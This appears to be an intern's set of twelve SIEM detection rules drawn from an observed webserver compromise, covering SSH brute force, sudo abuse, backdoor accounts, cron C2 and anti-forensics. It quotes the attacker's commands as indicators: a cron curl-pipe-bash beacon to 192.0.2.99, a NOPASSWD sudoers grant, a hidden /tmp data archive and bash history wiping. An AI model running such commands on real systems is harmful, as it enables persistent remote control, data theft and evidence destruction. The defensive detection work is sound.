# 🔍 Detection Rules & SIEM Alert Logic
### Based on Attack Patterns Observed in webserver01 Compromise

> These rules can be implemented in Splunk, Elastic SIEM, Wazuh, or any log management platform.
> Each rule includes the trigger condition, the reason it matters, and the recommended response.

---

## RULE-01 — SSH Brute-Force Detection
```
TRIGGER:   ≥10 "Failed password" events from a single source IP within 5 minutes
LOG:       auth.log / sshd
SEVERITY:  HIGH
SUPPRESS:  1 alert per IP per 5-minute window (suppress after block confirmed)

REASON:    Automated password spraying / dictionary attack in progress.
           Observed: 40+ rapid failures from 198.51.100.23 starting 03:14:02

ACTION:
  - Block source IP at firewall immediately
  - Alert SOC analyst
  - Add IP to threat intelligence feed
  - Check if any login succeeded during the same window (cross-reference RULE-03)
```

---

## RULE-02 — Invalid Username Enumeration
```
TRIGGER:   ≥5 "Invalid user" messages from a single source IP within 3 minutes
LOG:       auth.log / sshd
SEVERITY:  MEDIUM
SUPPRESS:  1 alert per IP per 3-minute window

REASON:    Attacker scanning for valid usernames before targeted attack.
           Observed: 20+ invalid usernames probed before focusing on "backup"

ACTION:
  - Log all usernames attempted (for credential monitoring)
  - Rate-limit SSH connections from offending IP
  - Consider temporary block via fail2ban
```

---

## RULE-03 — Successful Login After Multiple Failures (Critical)
```
TRIGGER:   "Accepted password" from IP that had ≥5 prior "Failed password" events
           within the preceding 30 minutes
LOG:       auth.log / sshd
SEVERITY:  CRITICAL
SUPPRESS:  No suppression — alert on every occurrence

REASON:    Brute-force attack succeeded — active intrusion is underway.
           Observed: 198.51.100.23 succeeded after 8 failures against "backup"

ACTION:
  - Terminate active SSH session immediately
  - Lock compromised account: passwd -l [username]
  - Force password reset
  - Escalate to Tier 2 SOC immediately
  - Begin incident response procedure
```

---

## RULE-04 — Password Authentication from Non-Approved IP
```
TRIGGER:   SSH "Accepted password" (not "Accepted publickey") from IP
           not in the approved IP allowlist
LOG:       auth.log / sshd
SEVERITY:  HIGH
SUPPRESS:  Alert on every occurrence

REASON:    Service accounts should use key-based auth only.
           "backup" account had password login enabled — should not have.

ACTION:
  - Terminate session
  - Lock account
  - Force public-key only for all service accounts
  - Review /etc/ssh/sshd_config — PasswordAuthentication no
```

---

## RULE-05 — Off-Hours sudo Activity
```
TRIGGER:   sudo event logged between 22:00 and 06:00
           from a non-scheduled / non-maintenance account
LOG:       auth.log / sudo
SEVERITY:  HIGH
SUPPRESS:  Alert on each event outside approved maintenance windows

REASON:    03:45–03:46 privilege escalation occurred entirely outside normal hours.
           Legitimate admins rarely require root access at 3 AM.

ACTION:
  - Alert on-call security engineer
  - Review all sudo commands executed in that session
  - Verify with account owner via out-of-band channel
```

---

## RULE-06 — New User Account Created Outside Change Window
```
TRIGGER:   useradd or adduser command executed outside approved
           change-management time windows
LOG:       auth.log / useradd / auditd
SEVERITY:  HIGH
SUPPRESS:  Alert on every occurrence

REASON:    Attacker created "sysupdate" account at 03:47:11 for persistent backdoor.
           No legitimate reason to create accounts at 3 AM on a production server.

ACTION:
  - Immediately disable new account
  - Review /etc/passwd and /etc/shadow for all recent additions
  - Escalate to security team
  - Compare against approved user baseline
```

---

## RULE-07 — NOPASSWD or ALL=(ALL) Written to sudoers
```
TRIGGER:   Write event to /etc/sudoers or /etc/sudoers.d/ containing
           "NOPASSWD" or "ALL=(ALL)" strings
LOG:       auditd (file write monitoring)
SEVERITY:  CRITICAL
SUPPRESS:  No suppression — alert immediately on every occurrence

REASON:    Attacker appended "sysupdate ALL=(ALL) NOPASSWD:ALL" giving
           permanent passwordless root — highest severity persistence.

ACTION:
  - Revert /etc/sudoers to last known-good state
  - Audit all current sudo grants
  - Enable File Integrity Monitoring (FIM) on /etc/sudoers
  - Escalate to Tier 2 SOC
```

---

## RULE-08 — Malicious Cron Job Injection
```
TRIGGER:   crontab write event containing any of:
             - "curl | bash" or "wget | sh"
             - External IP address pattern (non-RFC1918)
             - URL pointing to non-approved domain
LOG:       auditd / syslog (cron)
SEVERITY:  CRITICAL
SUPPRESS:  Alert on every crontab modification with external references

REASON:    Attacker installed: */10 * * * * curl -s http://192.0.2.99/update.sh | bash
           Active C2 beacon — server phones home every 10 minutes.

ACTION:
  - Remove malicious cron entry immediately
  - Block C2 IP at perimeter firewall
  - Scan /tmp and /var/tmp for downloaded payloads
  - Check all cron locations: /etc/crontab, /etc/cron.d, /var/spool/cron/
```

---

## RULE-09 — Outbound Connection to Unknown External IP
```
TRIGGER:   IPTABLES-OUT log showing connection to IP not in approved
           external service allowlist (OS updates, CDN, DNS, etc.)
LOG:       syslog / iptables / netflow
SEVERITY:  HIGH
SUPPRESS:  Alert on first connection, throttle repeats after containment

REASON:    Server initiated connection to 192.0.2.99:443 — attacker's C2 server.
           Confirmed by IPTABLES-OUT SYN → PSH+ACK → FIN sequence.

ACTION:
  - Block outbound IP immediately: iptables -A OUTPUT -d [IP] -j DROP
  - Capture full traffic if possible (pcap)
  - Initiate data breach assessment
  - Notify CISO
```

---

## RULE-10 — Sensitive Archive Created in /tmp
```
TRIGGER:   tar or zip/gzip write to /tmp, /var/tmp, or /dev/shm
           targeting paths containing: /var/www, /etc, /home, /root
           especially with hidden filename (leading dot)
LOG:       auditd EXECVE
SEVERITY:  MEDIUM
SUPPRESS:  Alert on every occurrence

REASON:    Attacker staged: tar czf /tmp/.cache_bkp.tar.gz /var/www/html /etc/nginx
           Hidden filename (.cache_bkp) used to blend with legitimate cache files.

ACTION:
  - Hash and preserve the archive as forensic evidence
  - Do NOT delete before forensic review
  - Quarantine system
  - Begin data breach impact assessment
```

---

## RULE-11 — Bash History Cleared
```
TRIGGER:   "echo >" targeting .bash_history file path
           OR "history -c" command executed
LOG:       auditd EXECVE / bash audit
SEVERITY:  HIGH
SUPPRESS:  Alert on every occurrence

REASON:    Attacker wiped /home/backup/.bash_history and ran "history -c"
           to destroy forensic evidence of all commands executed.

ACTION:
  - Increase auditd EXECVE logging scope immediately
  - Implement remote syslog forwarding — cannot be deleted locally
  - Attempt recovery from /proc/[pid]/fd or kernel audit buffers
  - Note: deliberate anti-forensics indicates experienced attacker
```

---

## RULE-12 — Repeated curl|bash C2 Pattern
```
TRIGGER:   Same CRON CMD matching "curl -s http://[IP]/[script] | bash"
           firing at intervals of ≤10 minutes, 3+ consecutive executions
LOG:       syslog (CRON entries)
SEVERITY:  CRITICAL
SUPPRESS:  Alert on first detection; suppress repeat alerts after containment confirmed

REASON:    Active C2 channel — server is under ongoing remote attacker control.
           Attacker can execute arbitrary code at any time via the cron trigger.

ACTION:
  - Remove cron entry immediately
  - Block C2 IP at network perimeter
  - Kill all active curl and bash descendant processes
  - Full server re-image is recommended as the safest remediation
  - Alert incident response team
```

---

*Detection rules authored by: Harmain Shah | Intern ID: CA0200 | Cryptonic Area Internship Program*
